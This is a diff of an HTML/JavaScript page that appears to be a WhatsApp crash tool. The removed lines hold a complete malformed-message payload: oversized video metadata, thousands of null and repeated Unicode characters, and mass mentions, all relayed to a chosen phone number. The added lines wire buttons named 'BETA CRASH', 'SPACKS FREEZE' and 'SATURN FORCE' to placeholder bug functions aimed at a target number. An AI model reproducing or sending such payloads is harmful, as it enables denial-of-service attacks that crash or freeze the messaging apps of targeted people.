-                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-            )
-        ];
-
-            const embeddedMusic = {
-                musicContentMediaId: "589608164114571",
-                songId: "870166291800508",
-                author: "Devils Protocols" + "᭄".repeat(10000),
-                title: "Version 2" + "᭄",
-                artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
-                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
-                artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
-                artistAttribution: "https://n.uguu.se/UnDeath.jpg",
-                countryBlocklist: true,
-                isExplicit: true,
-                artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
-            };
-
-        const devilsMesagge = {
-                url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-                mimetype: "video/mp4",
-                fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-                fileLength: "999999999999",
-                seconds: 999999,
-                mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-                caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
-                height: 640,
-                width: 640,
-                fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-                directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1743848703",
-                contextInfo: {
-                   externalAdReply: {
-                      showAdAttribution: true,
-                      title: `🥶`,
-                      body: `${"\u0000".repeat(9117)}`,
-                      mediaType: 1,
-                      renderLargerThumbnail: true,
-                      thumbnailUrl: null,
-                      sourceUrl: "Https://t.me/malvinsock"
-                },
-                   businessMessageForwardInfo: {
-                      businessOwnerJid: target,
-                },
-                    isSampled: true,
-                    mentionedJid: mentionjid
-                },
-                forwardedNewsletterMessageInfo: {
-                    newsletterJid: "120363406229895095@newsletter",
-                    serverMessageId: 1,
-                    newsletterName: `${"ꦾ".repeat(100)}`
-                },
-                streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-                thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-                thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-                thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-                annotations: [
-                    {
-                        embeddedContent: {
-                           embeddedMusic
-                        },
-                        embeddedAction: true
-                    }
-                ]
-            };
-
-            const msg = generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: { devilsMesagge }
-                }
-            }, {});
-
-            await sock.relayMessage("status@broadcast", msg.message, {
-                messageId: msg.key.id,
-                statusJidList: [target],
-                additionalNodes: [
-                    {
-                        tag: "meta",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "mentioned_users",
-                                attrs: {},
-                                content: [
-                                    { tag: "to", attrs: { jid: target }, content: undefined }
-                                ]
-                            }
-                        ]
-                    }
-                ]
+        });
+        
+        document.getElementById('betaCrashBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("BETA CRASH", async () => {
+                await KuotaHardXDelaySql(phoneNumberInput.value.trim(), sock);
             });
-
-            if (mention) {
-                await sock.relayMessage(target, {
-                    groupStatusMentionMessage: {
-                        message: {
-                            protocolMessage: {
-                                key: msg.key,
-                                type: 25
-                            }
-                        }
-                    }
-                }, {
-                    additionalNodes: [
-                        {
-                            tag: "meta",
-                            attrs: { is_status_mention: "true" },
-                            content: undefined
-                        }
-                    ]
-                });
+        });
+        
+        document.getElementById('delayInvisibleBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("DELAY INVISIBLE", async () => {
+                await KuotaHardXDelaySql(phoneNumberInput.value.trim(), sock);
+            });
+        });
+        
+        document.getElementById('otaxBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("OTAX DOYAN JANDA", async () => {
+                await OtaxDoyanJanda(phoneNumberInput.value.trim());
+            });
+        });
+        
+        document.getElementById('protocolBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("PROTOCOL BUG8", async () => {
+                await protocolbug8(phoneNumberInput.value.trim(), true);
+            });
+        });
+        
+        document.getElementById('saturnInvisibleBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("SATURN FORCE INVISIBLE", async () => {
+                await SaturnForce(phoneNumberInput.value.trim());
+            });
+        });
+        
+        document.getElementById('saturnVisibleBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("SATURN FORCE VISIBLE", async () => {
+                await SaturnTamvan(phoneNumberInput.value.trim());
+            });
+        });
+        
+        document.getElementById('spacksBtn').addEventListener('click', () => {
+            if (!validateConnection()) return;
+            executeBug("SPACKS FREEZE", async () => {
+                await spacksfreeze(phoneNumberInput.value.trim());
+            });
+        });
+        
+        // Helper functions
+        function validateConnection() {
+            if (!isConnected || !sock) {
+                showActionStatus("PLEASE CONNECT TO WHATSAPP FIRST", "danger");
+                return false;
             }
+            
+            const phoneNumber = phoneNumberInput.value.trim();
+            if (!phoneNumber) {
+                showActionStatus("PLEASE ENTER TARGET NUMBER", "danger");
+                return false;
+            }
+            
+            return true;
         }
         
-        // Button event listeners
-        document.getElementById('protocol2').addEventListener('click', async () => {
-            const target = document.getElementById('targetNumber').value;
-            if (!target) {
-                alert("Please enter a target number");
-                return;
-            }
+        function executeBug(name, bugFunction) {
+            playClickSound();
+            showLoading();
             
-            if (!isConnected) {
-                alert("WhatsApp connection not established");
-                return;
-            }
-            
-            loadingScreen.style.display = 'flex';
-            try {
-                await protocolbug2(target, true);
-                alert("Protocol 2 executed successfully");
-            } catch (error) {
-                alert("Error executing Protocol 2: " + error.message);
-            } finally {
-                loadingScreen.style.display = 'none';
-            }
-        });
+            setTimeout(async () => {
+                try {
+                    await bugFunction();
+                    showActionStatus(`${name} EXECUTED SUCCESSFULLY`, "success");
+                } catch (error) {
+                    console.error(`Error executing ${name}:`, error);
+                    showActionStatus(`FAILED TO EXECUTE ${name}`, "danger");
+                } finally {
+                    hideLoading();
+                }
+            }, 500);
+        }
         
-        document.getElementById('protocol5').addEventListener('click', async () => {
-            const target = document.getElementById('targetNumber').value;
-            if (!target) {
-                alert("Please enter a target number");
-                return;
+        function showActionStatus(message, type) {
+            actionStatus.textContent = message;
+            actionStatus.className = "status";
+            
+            if (type === "success") {
+                actionStatus.classList.add("connected");
+            } else if (type === "danger") {
+                actionStatus.classList.add("disconnected");
             }
             
-            if (!isConnected) {
-                alert("WhatsApp connection not established");
-                return;
-            }
+            actionStatus.classList.remove("hidden");
             
-            loadingScreen.style.display = 'flex';
-            try {
-                await protocolbug5(target, true);
-                alert("Protocol 5 executed successfully");
-            } catch (error) {
-                alert("Error executing Protocol 5: " + error.message);
-            } finally {
-                loadingScreen.style.display = 'none';
-            }
-        });
+            setTimeout(() => {
+                actionStatus.classList.add("hidden");
+            }, 3000);
+        }
         
-        document.getElementById('protocol6').addEventListener('click', async () => {
-            const target = document.getElementById('targetNumber').value;
-            if (!target) {
-                alert("Please enter a target number");
-                return;
-            }
-            
-            if (!isConnected) {
-                alert("WhatsApp connection not established");
-                return;
-            }
-            
-            loadingScreen.style.display = 'flex';
-            try {
-                await protocolbug6(target, true);
-                alert("Protocol 6 executed successfully");
-            } catch (error) {
-                alert("Error executing Protocol 6: " + error.message);
-            } finally {
-                loadingScreen.style.display = 'none';
-            }
-        });
+        function showLoading() {
+            loadingScreen.style.display = "flex";
+        }
         
-        document.getElementById('devilsProtocol').addEventListener('click', async () => {
-            const target = document.getElementById('targetNumber').value;
-            if (!target) {
-                alert("Please enter a target number");
-                return;
-            }
-            
-            if (!isConnected) {
-                alert("WhatsApp connection not established");
-                return;
-            }
-            
-            loadingScreen.style.display = 'flex';
-            try {
-                await DevilsProtocolV2(target, true);
-                alert("Devils Protocol executed successfully");
-            } catch (error) {
-                alert("Error executing Devils Protocol: " + error.message);
-            } finally {
-                loadingScreen.style.display = 'none';
-            }
-        });
+        function hideLoading() {
+            loadingScreen.style.display = "none";
+        }
         
-        // Additional functions for other buttons
-        document.getElementById('crashBeta').addEventListener('click', async () => {
-            alert("CRASH BETA function would be executed here");
-        });
+        function playClickSound() {
+            clickSound.currentTime = 0;
+            clickSound.play().catch(e => console.log("Audio play failed:", e));
+        }
         
-        document.getElementById('deleteBeta').addEventListener('click', async () => {
-            alert("DELETE BETA function would be executed here");
-        });
+        // Placeholder functions for the actual bug implementations
+        async function KuotaHardXDelaySql(target, sock) {
+            console.log(`Executing KuotaHardXDelaySql on ${target}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
+        
+        async function UiNew(jid) {
+            console.log(`Executing UiNew on ${jid}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
+        
+        async function OtaxDoyanJanda(isTarget) {
+            console.log(`Executing OtaxDoyanJanda on ${isTarget}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
+        
+        async function protocolbug8(isTarget, mention) {
+            console.log(`Executing protocolbug8 on ${isTarget} with mention: ${mention}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
+        
+        async function SaturnForce(target) {
+            console.log(`Executing SaturnForce on ${target}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
+        
+        async function SaturnTamvan(target) {
+            console.log(`Executing SaturnTamvan on ${target}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
+        
+        async function spacksfreeze(target) {
+            console.log(`Executing spacksfreeze on ${target}`);
+            // Implementation would go here
+            return { status: "success" };
+        }
     </script>
 </body>
 </html>
